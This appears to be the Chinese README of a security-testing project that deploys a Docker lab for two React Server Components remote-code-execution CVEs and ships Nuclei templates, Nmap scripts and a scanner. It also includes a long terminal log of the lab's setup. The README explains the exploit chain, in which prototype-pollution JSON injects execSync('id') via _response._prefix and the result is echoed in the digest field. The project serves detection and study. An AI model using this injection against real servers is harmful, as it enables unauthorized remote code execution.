# React Server Components (RSC) 漏洞检测与靶场工具集
# RSC-VulnLab


中文说明 | [English](./english-README.md)

---

本项目提供了针对 React Server Components (RSC) 相关漏洞的检测工具和一键部署靶场环境，主要涵盖 CVE-2025-55182 (React2Shell) 和 CVE-2025-66478 (Next.js RSC RCE) 两个高危漏洞。

## 目录结构

```
.
├── install_nuclei.sh                      # Nuclei 扫描器官方安装脚本
├── setup_rsc_two_cves_lab.sh             # 双靶场漏洞环境一键部署脚本
├── next_rsc_two_cves_lab/                # 靶场环境目录
│   ├── docker-compose.yml                # Docker Compose 配置文件
│   ├── nextjs-66478/                     # Next.js 16.0.6 漏洞环境
│   ├── nextjs-rce-scanner                # Next.js RSC RCE 扫描器二进制文件
│   └── urls.txt                          # 目标 URL 列表
├── nmap-nse/                             # Nmap NSE 检测脚本
│   ├── nextjs-rsc-cve-2025-66478-detect.nse
│   └── react2shell-cve-2025-55182-detect.nse
└── nuclei-custom/                        # Nuclei 自定义模板
    ├── nextjs-cve-2025-66478-rce-3001.yaml
    ├── nextjs-cve-2025-66478-rce-body-id.yaml
    ├── react2shell-cve-2025-55182-rce-body-id.yaml
    └── react2shell-cve-2025-55182-rce-safe-check.yaml
```

## 漏洞概述

### CVE-2025-55182 (React2Shell)
- 影响版本：受影响的 React/Next.js 应用
- 漏洞类型：通过 RSC 反序列化实现远程代码执行
- 靶场端口：3000

### CVE-2025-66478 (Next.js RSC RCE)
- 影响版本：Next.js 16.0.6 及其他易受攻击版本
- 漏洞类型：通过 NEXT_REDIRECT digest 注入实现远程代码执行
- 靶场端口：3001

## 快速开始

### 1. 部署靶场环境

运行一键部署脚本，将自动构建并启动两个漏洞靶场：

```bash
bash setup_rsc_two_cves_lab.sh
```

部署完成后，可通过以下地址访问：

- React2Shell (CVE-2025-55182): `http://服务器IP:3000`
- Next.js 16.0.6 (CVE-2025-66478): `http://服务器IP:3001`

停止靶场环境：

```bash
cd next_rsc_two_cves_lab
docker compose down
```

### 2. 安装 Nuclei 扫描器

使用官方安装脚本安装 Nuclei v3.6.0：

```bash
bash install_nuclei.sh
```

安装完成后验证：

```bash
nuclei -version
```

## 检测工具使用

### Nuclei 模板扫描

使用自定义 Nuclei 模板进行漏洞检测：

```bash
# 检测 React2Shell (CVE-2025-55182)
nuclei -t nuclei-custom/react2shell-cve-2025-55182-rce-safe-check.yaml -u http://目标IP:3000

# 检测 Next.js RSC RCE (CVE-2025-66478)
nuclei -t nuclei-custom/nextjs-cve-2025-66478-rce-3001.yaml -u http://目标IP:3001

# 批量扫描
nuclei -t nuclei-custom/ -l urls.txt
```

### Nmap NSE 脚本检测

使用 Nmap 脚本引擎进行端口扫描和漏洞检测：

```bash
# 检测 React2Shell (端口 3000)
nmap --script=nmap-nse/react2shell-cve-2025-55182-detect.nse -p 3000 目标IP

# 检测 Next.js RSC RCE (端口 3001)
nmap --script=nmap-nse/nextjs-rsc-cve-2025-66478-detect.nse -p 3001 目标IP

# 同时检测两个漏洞
nmap --script=nmap-nse/*.nse -p 3000,3001 目标IP
```

### Go 扫描器使用

如果已构建 Go 扫描器，可直接运行：

```bash
cd next_rsc_two_cves_lab
./nextjs-rce-scanner -l urls.txt
```

## 检测原理

所有检测工具均通过以下方式验证漏洞：

1. 发送精心构造的 RSC multipart/form-data 请求
2. 触发服务端执行安全命令（如 `id`）
3. 检查响应中的 `digest` 字段是否包含命令执行结果
4. 提取并展示命令输出（如 `uid=0(root)`）

检测过程仅执行读取系统信息的命令，不会对目标系统造成破坏。

## 工具说明

### install_nuclei.sh
- 从 GitHub 官方仓库下载 Nuclei v3.6.0
- 支持代理环境下载
- 自动安装并配置到 `/usr/local/bin/nuclei`

### setup_rsc_two_cves_lab.sh
- 自动克隆相关 PoC 仓库（通过 hxorz.cn 代理）
- 生成 Next.js 16.0.6 漏洞项目
- 构建并启动两个 Docker 容器
- 可选构建 Go 扫描器和 Python PoC 环境

### Nuclei 模板特性
- 支持精确的正则表达式匹配
- 自动提取命令执行输出
- 分级检测（安全检查 / Body ID 检查 / 端口特定检查）

### Nmap NSE 脚本特性
- 专注于 digest 字段检测
- 不执行破坏性命令
- 详细的漏洞确认输出
- 支持自定义端口规则

## 安全警告

本项目仅供授权安全测试和学习研究使用。使用前请确保：

1. 仅在受控的本地环境或已获授权的测试环境中部署靶场
2. 不得将检测工具用于未经授权的系统
3. 遵守当地法律法规和网络安全相关规定

## 参考资源

- CVE-2025-55182: https://github.com/msanft/CVE-2025-55182
- React2Shell: https://github.com/subzer0x0/React2Shell
- Next.js RSC RCE Scanner: https://github.com/Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478
- Nuclei: https://github.com/projectdiscovery/nuclei

## 技术栈

- Docker & Docker Compose
- Node.js 22 (Alpine)
- Next.js 16.0.6
- Nuclei v3.6.0
- Nmap NSE (Lua)
- Go (扫描器)
- Python 3 (PoC 环境)

## 许可证

本项目中的检测脚本和工具遵循各自的开源许可证：
- Nmap NSE 脚本：与 Nmap 相同许可证
- Nuclei 模板：与 Nuclei 相同许可证
- 其他工具：请参考各原始项目的许可证

## 作者

hxorz

## 免责声明

本项目仅用于安全研究和教育目的。使用者应自行承担使用本项目所产生的一切法律责任。项目作者不对任何滥用行为负责。

# 漏洞环境搭建

![](https://files.mdnice.com/user/108782/94682281-8bc7-44b5-bf8e-a6e740d82a41.png)

![](https://files.mdnice.com/user/108782/1571409c-87e7-46ba-8c30-fc0685de322b.jpg)

![](https://files.mdnice.com/user/108782/eec46761-a48d-4dbc-aaaf-f343533fdfaa.png)

![](https://files.mdnice.com/user/108782/44600b68-6119-47c2-9d5c-1b4d45d73018.jpg)

![](https://files.mdnice.com/user/108782/bcffe11d-6b1b-40cb-917c-13a1ad35b507.jpg)

![](https://files.mdnice.com/user/108782/4cf183e1-e22e-47a8-8159-d0658dcfbf90.jpg)

![](https://files.mdnice.com/user/108782/ae423bba-e56b-4483-bb6d-72e478d9cc23.jpg)

![](https://files.mdnice.com/user/108782/1c969ab9-f370-4cec-a2f6-e8bc7794cda7.png)

![](https://files.mdnice.com/user/108782/15efa876-d7b4-4e46-a929-39aefbfb0454.png)

![](https://files.mdnice.com/user/108782/3ab32ce2-899e-4efd-bfff-2e5f3f399c51.png)

# 验证漏洞存在

![](https://files.mdnice.com/user/108782/2485cbdf-6520-417c-aeba-481cc21fab02.png)

# 安装nuclei编写规则检测结果截图

## nextjs-cve-2025-66478-rce-3001.yaml 的检测原理

这个模板是**针对固定靶场端口 3001 的 Next.js 16.0.6 漏洞环境做“强确认型”检测**。它通过构造一个标准的 RSC multipart/form-data 请求，在 JSON 中利用 `then: "$1:__proto__:then"` 和 `_response._prefix` 触发 RSC 反序列化链，将 `_prefix` 注入为一段 Node.js 代码，实际执行的是 `process.mainModule.require('child_process').execSync('id')`。执行结果被拼接进抛出的 `Error('NEXT_REDIRECT')` 的 `digest` 字段里。模板的匹配逻辑不是只看状态码，而是 直接在 RSC 流式响应中正则匹配 `uid=0(root)` ，也就是说：只有当目标真实以 root 身份执行了 `id` 命令，这个模板才会判定为命中，属于“真·root 级 RCE 校验”。

---

## nextjs-cve-2025-66478-rce-body-id.yaml 的检测原理

这个模板走的利用链和上一个是一样的，都是通过 RSC 反序列化 + `_response._prefix` 注入执行 `id`，但**判断方式更偏通用型**。它不限定端口，也不只盯 `uid=0(root)`，而是在 HTTP 响应 body 中通过正则去匹配 `uid=... gid=... groups=...` 这种完整的 `id` 命令输出结构。只要服务端返回了符合 Linux `id` 输出格式的内容，就认定命令被真实执行。这个模板的定位是：**用于批量扫描和通用环境确认，重点验证“是否存在真实命令执行回显”**，而不是只盯 root 权限。

---

## react2shell-cve-2025-55182-rce-body-id.yaml 的检测原理

这个模板是**专门适配 React2Shell 场景的 RSC RCE 检测**。它同样通过构造带有 `then: "$1:__proto__:then"` 的 RSC 数据结构，把 `_response._prefix` 注入为执行 `execSync('id')` 的 Node.js 代码，并通过 `NEXT_REDIRECT` 错误的 `digest` 字段回传执行结果。不同点在于：它的匹配目标是 `uid=1001(nextjs) gid=1001(nodejs)` 这一类 React2Shell 默认容器用户的输出特征，而不是 root。也就是说，这个模板的核心验证点是：**确认 React2Shell 环境下是否真的存在“RSC → 系统命令执行 → 回显到 digest”这条完整链路**。

---

## react2shell-cve-2025-55182-rce-safe-check.yaml 的检测原理

这个模板是 React2Shell 的**“安全验证版”检测脚本**，走的利用路径与上一个基本一致，但在检测策略上更加克制和严谨。它同样注入 `execSync('id')`，但在结果判定时采用了多重条件联合判断，包括：

- HTTP 状态码必须为 500（符合 RSC 异常返回特征）
- 响应类型必须是 `text/x-component`（确认是 RSC 流）
- 响应中必须正则匹配到 `uid=1001(nextjs) gid=1001(nodejs)`

只有这三项同时满足，才判定为漏洞存在。更适合在红队前期探测或防守侧验证阶段使用。

![](https://files.mdnice.com/user/108782/d96d6334-4c33-4024-b150-3235f424e44d.jpg)

![](https://files.mdnice.com/user/108782/44ce2c17-deba-497d-9956-30e068d5ec5b.jpg)

![](https://files.mdnice.com/user/108782/689af3fe-715c-4ff4-8d9e-c0eb607300f3.png)

![](https://files.mdnice.com/user/108782/bbf86516-8eab-4f8f-bbe3-5cc46fa486a9.jpg)

![](https://files.mdnice.com/user/108782/31dc5237-1526-4971-b2bb-9c983c3d27a3.jpg)

![](https://files.mdnice.com/user/108782/849cc9a1-c15f-4762-9397-1cee3f02f78d.jpg)

![](https://files.mdnice.com/user/108782/381791d5-48c2-4b5b-ac9f-22e098bbc3d8.png)

![](https://files.mdnice.com/user/108782/f5bfeeec-7bdf-4bba-825e-ba7892bce9fc.jpg)

![](https://files.mdnice.com/user/108782/62e9a760-83b0-401b-ba58-edd1f54cb1cf.jpg)

# 编写nmap脚本进行检测结果截图

## nextjs-rsc-cve-2025-66478-detect.nse 的检测原理

这个 NSE 脚本的思路很直接：**它不尝试真正去打 RCE，而是专门从“网络行为特征”上判断目标像不像 Next.js RSC 漏洞环境**。脚本会对目标 3001 端口发起一次构造好的 HTTP 请求，重点观察三件事：
- 第一，返回的状态码是否为 500（这是 RSC 在异常反序列化或重定向失败时的典型表现）；
- 第二，响应头里的 `Content-Type` 是否为 `text/x-component`，用来确认这是一个真实的 RSC 响应流；
- 第三，从响应体中提取是否存在稳定的 `digest` 特征值。

一旦这三点同时成立，就可以判断：**这个端口暴露了完整的 RSC 处理链路，而且和 CVE-2025-66478 的行为特征高度一致**。它的作用更偏“网络侧确认”，适合放在资产扫描或红队初筛阶段用，而不是直接作为利用脚本。

---

## react2shell-cve-2025-55182-detect.nse 的检测原理

这个 NSE 脚本是专门针对 React2Shell 场景写的，同样走的是**“不真打系统命令，只看关键行为特征”**这条路子。脚本会向 3000 端口发送一组模拟 RSC 请求，重点检查三类返回特征：首先是 HTTP 500 状态码，其次是 `text/x-component` 这个 RSC 专用响应类型，最后是响应体中是否出现稳定的 digest 输出模式。如果这些条件同时满足，就说明：**目标当前的处理逻辑和 React2Shell 型 RSC 漏洞的典型行为是对得上的**。这个脚本的定位很清晰，它不是拿来“直接打穿系统”的，而是用来在网络层快速判断：这个服务到底有没有暴露出 React2Shell 这一类 RSC 风险入口。


![](https://files.mdnice.com/user/108782/f09bdc4e-085a-41ff-97b6-5a997d6155f6.png)

# 环境说明

目前仓库里**只公开了检测脚本、靶场一键搭建脚本，以及 Nuclei 的安装脚本**，所有内容都可以直接拉下来自己复现、自己验证。如果你觉得这个项目对你有用，欢迎点个 Star。

另外也说明一下，这套环境是在 **Ubuntu 20.04.5 LTS（内核 5.4.0-216-generic，x86_64）** 上通过 SSH 实际搭建和完整验证的，Docker 网络、Nuclei 扫描、Nmap NSE 检测和交互式 RCE Shell 都是在这个系统环境下跑通的，供你在本地复现时参考。


>
>1.CVE-2025-55182  
https://github.com/msanft/CVE-2025-55182  
>
>2.React2Shell  
https://github.com/subzer0x0/React2Shell  
>
>3.Next.js RSC RCE Scanner（CVE-2025-66478）  
https://github.com/Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478  
>
>4.Nuclei  
https://github.com/projectdiscovery/nuclei
>

# 附录：

```bash
hx@orz:~$ cat /etc/docker/daemon.json 
{
  "registry-mirrors": ["https://hub.hxorz.cn"]
}

hx@orz:~$ mkdir 1207 && cd 1207
hx@orz:~/1207$ vim setup_rsc_two_cves_lab.sh
hx@orz:~/1207$ chmod +x setup_rsc_two_cves_lab.sh 
hx@orz:~/1207$ sudo docker images
[sudo] password for hx: 
REPOSITORY   TAG       IMAGE ID   CREATED   SIZE
hx@orz:~/1207$ sudo docker ps -a
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
hx@orz:~/1207$ 
hx@orz:~/1207$ vim setup_rsc_two_cves_lab.sh
hx@orz:~/1207$ chmod +x setup_rsc_two_cves_lab.sh 
hx@orz:~/1207$ sudo docker images
[sudo] password for hx: 
REPOSITORY   TAG       IMAGE ID   CREATED   SIZE
hx@orz:~/1207$ sudo docker ps -a
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
hx@orz:~/1207$ ./setup_rsc_two_cves_lab.sh 
[*] 创建实验目录: next_rsc_two_cves_lab
[*] 克隆 msanft/CVE-2025-55182 (via hxorz.cn)...
Cloning into 'CVE-2025-55182-msanft'...
remote: Enumerating objects: 62, done.
remote: Counting objects: 100% (62/62), done.
remote: Compressing objects: 100% (53/53), done.
remote: Total 62 (delta 17), reused 54 (delta 9), pack-reused 0 (from 0)
Unpacking objects: 100% (62/62), 64.41 KiB | 3.58 MiB/s, done.
[*] 克隆 Malayke/Next.js-RSC-RCE-Scanner-CVE-2025-66478 (via hxorz.cn)...
Cloning into 'Next.js-RSC-RCE-Scanner-CVE-2025-66478'...
remote: Enumerating objects: 120, done.
remote: Counting objects: 100% (120/120), done.
remote: Compressing objects: 100% (87/87), done.
remote: Total 120 (delta 66), reused 85 (delta 33), pack-reused 0 (from 0)
Receiving objects: 100% (120/120), 4.29 MiB | 1.51 MiB/s, done.
Resolving deltas: 100% (66/66), done.
[*] 克隆 subzer0x0/React2Shell 源码 (via hxorz.cn)...
Cloning into 'React2Shell-src'...
remote: Enumerating objects: 51, done.
remote: Counting objects: 100% (51/51), done.
remote: Compressing objects: 100% (45/45), done.
remote: Total 51 (delta 17), reused 36 (delta 6), pack-reused 0 (from 0)
Unpacking objects: 100% (51/51), 69.75 KiB | 4.65 MiB/s, done.
[*] 使用 create-next-app@16.0.6 生成项目 nextjs-66478...
Need to install the following packages:
create-next-app@16.0.6
Ok to proceed? (y) y

✔ Would you like to use TypeScript? … No / Yes
✔ Which linter would you like to use? › ESLint
✔ Would you like to use React Compiler? … No / Yes
✔ Would you like to use Tailwind CSS? … No / Yes
✔ Would you like your code inside a `src/` directory? … No / Yes
Creating a new Next.js app in /home/hx/1207/next_rsc_two_cves_lab/nextjs-66478.

Using npm.

Initializing project with template: app-tw 


Installing dependencies:
- next
- react
- react-dom

Installing devDependencies:
- @tailwindcss/postcss
- @types/node
- @types/react
- @types/react-dom
- babel-plugin-react-compiler
- eslint
- eslint-config-next
- tailwindcss
- typescript

npm warn deprecated next@16.0.6: This version has a security vulnerability. Please upgrade to a patched version. See https://nextjs.org/blog/CVE-2025-66478 for more details.

added 427 packages, and audited 428 packages in 1m

174 packages are looking for funding
  run `npm fund` for details

1 critical severity vulnerability

To address all issues, run:
  npm audit fix --force

Run `npm audit` for details.

Generating route types...
✓ Types generated successfully

Success! Created nextjs-66478 at /home/hx/1207/next_rsc_two_cves_lab/nextjs-66478

A new version of `create-next-app` is available!
You can update by running: npm i -g create-next-app

npm notice
npm notice New patch version of npm available! 11.6.1 -> 11.6.4
npm notice Changelog: https://github.com/npm/cli/releases/tag/v11.6.4
npm notice To update run: npm install -g npm@11.6.4
npm notice
[*] 启动 docker-compose（React2Shell + Next.js 16.0.6）...
WARN[0000] /home/hx/1207/next_rsc_two_cves_lab/docker-compose.yml: the attribute `version` is obsolete, it will be ignored, please remove it to avoid potential confusion 
[+] Running 11/11
 ✔ react2shell Pulled                                                                                           60.5s 
   ✔ 014e56e61396 Pull complete                                                                                  3.8s 
   ✔ d28ab52fe429 Pull complete                                                                                 16.5s 
   ✔ 34226f541496 Pull complete                                                                                 16.6s 
   ✔ 6ac8cc1f0b52 Pull complete                                                                                 16.6s 
   ✔ 61d30b51a1dc Pull complete                                                                                 16.6s 
   ✔ e11d0ea2ade0 Pull complete                                                                                 16.6s 
   ✔ 75bf8a6ab3ca Pull complete                                                                                 16.6s 
   ✔ 0e76b23c6844 Pull complete                                                                                 16.7s 
   ✔ 3ca452f0873f Pull complete                                                                                 55.8s 
   ✔ 3183f2476674 Pull complete                                                                                 55.8s 
Compose can now delegate builds to bake for better performance.
 To do so, set COMPOSE_BAKE=true.
[+] Building 24.3s (7/9)                                                                               docker:default
 => [nextjs-66478 internal] load build definition from Dockerfile                                                0.0s
 => => transferring dockerfile: 392B                                                                             0.0s
 => [nextjs-66478 internal] load metadata for docker.io/library/node:22-alpine                                  10.9s
 => [nextjs-66478 internal] load .dockerignore                                                                   0.0s
 => => transferring context: 2B                                                                                  0.0s
 => [nextjs-66478 1/5] FROM docker.io/library/node:22-alpine@sha256:9632533eda8061fc1e9960cfb3f8762781c07a00ee  11.9s
 => => resolve docker.io/library/node:22-alpine@sha256:9632533eda8061fc1e9960cfb3f8762781c07a00ee7317f5dc0e13c0  0.0s
 => => sha256:9632533eda8061fc1e9960cfb3f8762781c07a00ee7317f5dc0e13c05e15166f 6.41kB / 6.41kB                   0.0s
 => => sha256:3404205afbfa99ffb663ec5ac28be64bd789541816885c75939c7d24dce06fa2 1.72kB / 1.72kB                   0.0s
 => => sha256:38925ee9872d372937cb288c928672b2481fef11e525889c0b9e2556466d2339 6.52kB / 6.52kB                   0.0s
 => => sha256:2e4fafc9c573e8168a7430607ae67549589fb2387ba7cd514a4e9c266c1a9760 51.60MB / 51.60MB                10.4s
 => => sha256:4745102427f1b0f32bbb42b1342f3aec192e0a029641fec018ff18aa1bd8177f 1.26MB / 1.26MB                   2.7s
 => => sha256:b9b992ae23a0421147ed82b168cabeb8aae5a9b2773a11d9bb440975d64d8da6 446B / 446B                       3.2s
 => => extracting sha256:2e4fafc9c573e8168a7430607ae67549589fb2387ba7cd514a4e9c266c1a9760                        1.4s
 => => extracting sha256:4745102427f1b0f32bbb42b1342f3aec192e0a029641fec018ff18aa1bd8177f                        0.0s
 => => extracting sha256:b9b992ae23a0421147ed82b168cabeb8aae5a9b2773a11d9bb440975d64d8da6                        0.0s
 => [nextjs-66478 internal] load build context                                                                   4.5s
 => => transferring context: 421.58MB                                                                            4.4s
 => [nextjs-66478 2/5] WORKDIR /app                                                                              1.2s
 => ERROR [nextjs-66478 3/5] COPY package.json package-lock.json* pnpm-lock.yaml* yarn.lock* ./ 2>/dev/null ||   0.3s
------
 > [nextjs-66478 3/5] COPY package.json package-lock.json* pnpm-lock.yaml* yarn.lock* ./ 2>/dev/null || true:
------
failed to solve: cannot copy to non-directory: /var/lib/docker/overlay2/eq9ai4q6zvjuioisvs664u752/merged/app/true
hx@orz:~/1207$ sudo docker images
REPOSITORY               TAG       IMAGE ID       CREATED        SIZE
arulkumarv/react2shell   v1        fa757ea34f26   36 hours ago   725MB
hx@orz:~/1207$ sudo docker ps -a
CONTAINER ID   IMAGE     COMMAND   CREATED   STATUS    PORTS     NAMES
hx@orz:~/1207$ sudo docker rmi fa757ea34f26
Untagged: arulkumarv/react2shell:v1
Untagged: arulkumarv/react2shell@sha256:947bef51e344672071944a055d7bcdd78ed9599fde5b7e97ee8794f822dec88a
Deleted: sha256:fa757ea34f2673ceee9c9cd8edc0ccb878e891749b2b502ff2deb40bd8a5971d
Deleted: sha256:db431f34d8aa3ea7ae8608753fccf537f697e2d8a3335a22316eb5e9df4ebedd
Deleted: sha256:0e41e252567a8e2b18f1f1a834d2a5ee7b5bdc33df62a507b94d56d7652155c9
Deleted: sha256:e4a2761967591585935d4692965bff1695dfd7675407762b8045565de5cd9fd4
Deleted: sha256:b51c0d63f910d4b2d88499dc919b762b51ade7fab8a840a4d33dd82f9be8250b
Deleted: sha256:2b71d09eccb4769d392f46e7f24d1cd3d24cb3122269436b0dbb1f2aca5c0e46
Deleted: sha256:760aec2bba612a29b0034eb8c7c42c88d10821ee2281a97d8efff2c5b933906b
Deleted: sha256:a7db4051d42c5bc75b622a53bb265590c3c3487403d81c501eb8d51fd976366b
Deleted: sha256:6fa6e977e23fb2ba981bca5e626df2dc6ba2bd8195baa9be846e85c0d6108551
Deleted: sha256:37bb581490bfa876c29bfdd4fe41f20da7d2325d7a30730cfdd1b423fb98d90c
hx@orz:~/1207$ ls
next_rsc_two_cves_lab  setup_rsc_two_cves_lab.sh
hx@orz:~/1207$ sudo rm -rf next_rsc_two_cves_lab/
hx@orz:~/1207$ rm -rf setup_rsc_two_cves_lab.sh 
hx@orz:~/1207$ vim setup_rsc_two_cves_lab.sh
hx@orz:~/1207$ chmod +x setup_rsc_two_cves_lab.sh 
hx@orz:~/1207$ ./setup_rsc_two_cves_lab.sh 
[*] 创建实验目录: next_rsc_two_cves_lab
[*] 克隆 CVE-2025-55182 PoC...
Cloning into 'CVE-2025-55182-msanft'...
remote: Enumerating objects: 62, done.
remote: Counting objects: 100% (62/62), done.
remote: Compressing objects: 100% (53/53), done.
remote: Total 62 (delta 17), reused 54 (delta 9), pack-reused 0 (from 0)
Unpacking objects: 100% (62/62), 64.41 KiB | 1.95 MiB/s, done.
[*] 克隆 Next.js 扫描器...
Cloning into 'Next.js-RSC-RCE-Scanner-CVE-2025-66478'...
remote: Enumerating objects: 120, done.
remote: Counting objects: 100% (120/120), done.
remote: Compressing objects: 100% (87/87), done.
remote: Total 120 (delta 66), reused 85 (delta 33), pack-reused 0 (from 0)
Receiving objects: 100% (120/120), 4.29 MiB | 1.61 MiB/s, done.
Resolving deltas: 100% (66/66), done.
[*] 克隆 React2Shell 源码...
Cloning into 'React2Shell-src'...
remote: Enumerating objects: 51, done.
remote: Counting objects: 100% (51/51), done.
remote: Compressing objects: 100% (45/45), done.
remote: Total 51 (delta 17), reused 36 (delta 6), pack-reused 0 (from 0)
Unpacking objects: 100% (51/51), 69.75 KiB | 4.65 MiB/s, done.
[*] 生成 Next.js 16.0.6 项目...
✔ Would you like to use TypeScript? … No / Yes
✔ Which linter would you like to use? › ESLint
✔ Would you like to use React Compiler? … No / Yes
✔ Would you like to use Tailwind CSS? … No / Yes
✔ Would you like your code inside a `src/` directory? … No / Yes
Creating a new Next.js app in /home/hx/1207/next_rsc_two_cves_lab/nextjs-66478.

Using npm.

Initializing project with template: app-tw 


Installing dependencies:
- next
- react
- react-dom

Installing devDependencies:
- @tailwindcss/postcss
- @types/node
- @types/react
- @types/react-dom
- babel-plugin-react-compiler
- eslint
- eslint-config-next
- tailwindcss
- typescript

npm warn deprecated next@16.0.6: This version has a security vulnerability. Please upgrade to a patched version. See https://nextjs.org/blog/CVE-2025-66478 for more details.

added 427 packages, and audited 428 packages in 38s

174 packages are looking for funding
  run `npm fund` for details

1 critical severity vulnerability

To address all issues, run:
  npm audit fix --force

Run `npm audit` for details.

Generating route types...
✓ Types generated successfully

Success! Created nextjs-66478 at /home/hx/1207/next_rsc_two_cves_lab/nextjs-66478

A new version of `create-next-app` is available!
You can update by running: npm i -g create-next-app

[*] 构建并启动两个漏洞容器...
WARN[0000] /home/hx/1207/next_rsc_two_cves_lab/docker-compose.yml: the attribute `version` is obsolete, it will be ignored, please remove it to avoid potential confusion 
WARN[0000] /home/hx/1207/next_rsc_two_cves_lab/docker-compose.yml: the attribute `version` is obsolete, it will be ignored, please remove it to avoid potential confusion 
[+] Running 11/11
 ✔ react2shell Pulled                                                                                           49.1s 
   ✔ 014e56e61396 Already exists                                                                                 0.0s 
   ✔ d28ab52fe429 Pull complete                                                                                 20.4s 
   ✔ 34226f541496 Pull complete                                                                                 20.4s 
   ✔ 6ac8cc1f0b52 Pull complete                                                                                 20.5s 
   ✔ 61d30b51a1dc Pull complete                                                                                 20.5s 
   ✔ e11d0ea2ade0 Pull complete                                                                                 20.5s 
   ✔ 75bf8a6ab3ca Pull complete                                                                                 20.5s 
   ✔ 0e76b23c6844 Pull complete                                                                                 20.6s 
   ✔ 3ca452f0873f Pull complete                                                                                 45.0s 
   ✔ 3183f2476674 Pull complete                                                                                 45.0s 
Compose can now delegate builds to bake for better performance.
 To do so, set COMPOSE_BAKE=true.
[+] Building 78.9s (11/11) FINISHED                                                                    docker:default
 => [nextjs-66478 internal] load build definition from Dockerfile                                                0.0s
 => => transferring dockerfile: 281B                                                                             0.0s
 => [nextjs-66478 internal] load metadata for docker.io/library/node:22-alpine                                   1.9s
 => [nextjs-66478 internal] load .dockerignore                                                                   0.0s
 => => transferring context: 2B                                                                                  0.0s
 => [nextjs-66478 1/5] FROM docker.io/library/node:22-alpine@sha256:9632533eda8061fc1e9960cfb3f8762781c07a00ee7  0.0s
 => [nextjs-66478 internal] load build context                                                                   3.3s
 => => transferring context: 421.58MB                                                                            3.3s
 => CACHED [nextjs-66478 2/5] WORKDIR /app                                                                       0.0s
 => [nextjs-66478 3/5] COPY package.json ./                                                                      0.9s
 => [nextjs-66478 4/5] RUN npm install                                                                          65.4s
 => [nextjs-66478 5/5] COPY . .                                                                                  2.7s 
 => [nextjs-66478] exporting to image                                                                            4.6s 
 => => exporting layers                                                                                          4.6s 
 => => writing image sha256:24b2a0b5daa497d6992484eb7288280631d57146ff2241d767328de0df904808                     0.0s 
 => => naming to docker.io/library/next_rsc_two_cves_lab-nextjs-66478                                            0.0s 
 => [nextjs-66478] resolving provenance for metadata file                                                        0.0s 
[+] Running 4/4
 ✔ nextjs-66478                           Built                                                                  0.0s 
 ✔ Network next_rsc_two_cves_lab_default  Created                                                                0.0s 
 ✔ Container react2shell-cve-2025-55182   Started                                                                0.4s 
 ✔ Container nextjs-cve-2025-66478        Started                                                                0.4s 
[*] 构建 Next.js 扫描器...

======================================================================

部署完成。

React2Shell（CVE-2025-55182）：
  本机访问:   curl http://127.0.0.1:3000
  远程访问:   http://10.211.55.65:3000

Next.js 16.0.6（CVE-2025-66478）：
  本机访问:   curl http://127.0.0.1:3001
  远程访问:   http://10.211.55.65:3001

当前容器状态：
----------------------------------------------------------------------
nextjs-cve-2025-66478        Up 7 seconds   0.0.0.0:3001->3000/tcp, :::3001->3000/tcp
react2shell-cve-2025-55182   Up 7 seconds   0.0.0.0:3000->3000/tcp, :::3000->3000/tcp
----------------------------------------------------------------------

停止环境：
  docker compose down

======================================================================
仅限本地 / 授权环境测试使用。
======================================================================

hx@orz:~/1207/next_rsc_two_cves_lab$ ./nextjs-rce-scanner -file urls.txt -c 1
[*] Starting scan of 1 targets, concurrency: 1
--------------------------------------------------------------------------------
[launcher.Browser]2025/12/07 06:28:57 Download: https://registry.npmmirror.com/-/binary/chromium-browser-snapshots/Linux_x64/1321438/chrome-linux.zip
[launcher.Browser]2025/12/07 06:28:57 Progress: 00%
[launcher.Browser]2025/12/07 06:28:58 Progress: 01%
[launcher.Browser]2025/12/07 06:28:59 Progress: 03%
[launcher.Browser]2025/12/07 06:29:00 Progress: 05%
[launcher.Browser]2025/12/07 06:29:01 Progress: 08%
[launcher.Browser]2025/12/07 06:29:02 Progress: 10%
[launcher.Browser]2025/12/07 06:29:03 Progress: 12%
[launcher.Browser]2025/12/07 06:29:04 Progress: 14%
[launcher.Browser]2025/12/07 06:29:05 Progress: 16%
[launcher.Browser]2025/12/07 06:29:06 Progress: 18%
[launcher.Browser]2025/12/07 06:29:07 Progress: 21%
[launcher.Browser]2025/12/07 06:29:08 Progress: 23%
[launcher.Browser]2025/12/07 06:29:09 Progress: 25%
[launcher.Browser]2025/12/07 06:29:10 Progress: 28%
[launcher.Browser]2025/12/07 06:29:11 Progress: 30%
[launcher.Browser]2025/12/07 06:29:12 Progress: 33%
[launcher.Browser]2025/12/07 06:29:13 Progress: 35%
[launcher.Browser]2025/12/07 06:29:15 Progress: 38%
[launcher.Browser]2025/12/07 06:29:16 Progress: 40%
[launcher.Browser]2025/12/07 06:29:17 Progress: 43%
[launcher.Browser]2025/12/07 06:29:18 Progress: 45%
[launcher.Browser]2025/12/07 06:29:19 Progress: 47%
[launcher.Browser]2025/12/07 06:29:20 Progress: 50%
[launcher.Browser]2025/12/07 06:29:21 Progress: 51%
[launcher.Browser]2025/12/07 06:29:22 Progress: 53%
[launcher.Browser]2025/12/07 06:29:23 Progress: 55%
[launcher.Browser]2025/12/07 06:29:24 Progress: 57%
[launcher.Browser]2025/12/07 06:29:25 Progress: 59%
[launcher.Browser]2025/12/07 06:29:26 Progress: 62%
[launcher.Browser]2025/12/07 06:29:27 Progress: 64%
[launcher.Browser]2025/12/07 06:29:28 Progress: 66%
[launcher.Browser]2025/12/07 06:29:29 Progress: 69%
[launcher.Browser]2025/12/07 06:29:30 Progress: 71%
[launcher.Browser]2025/12/07 06:29:31 Progress: 73%
[launcher.Browser]2025/12/07 06:29:32 Progress: 76%
[launcher.Browser]2025/12/07 06:29:33 Progress: 78%
[launcher.Browser]2025/12/07 06:29:34 Progress: 81%
[launcher.Browser]2025/12/07 06:29:35 Progress: 83%
[launcher.Browser]2025/12/07 06:29:36 Progress: 85%
[launcher.Browser]2025/12/07 06:29:37 Progress: 88%
[launcher.Browser]2025/12/07 06:29:38 Progress: 90%
[launcher.Browser]2025/12/07 06:29:39 Progress: 93%
[launcher.Browser]2025/12/07 06:29:40 Progress: 94%
[launcher.Browser]2025/12/07 06:29:41 Progress: 97%
[launcher.Browser]2025/12/07 06:29:42 Progress: 99%
[launcher.Browser]2025/12/07 06:29:42 Unzip: /home/hx/.cache/rod/browser/chromium-1321438
[launcher.Browser]2025/12/07 06:29:42 Progress: 00%
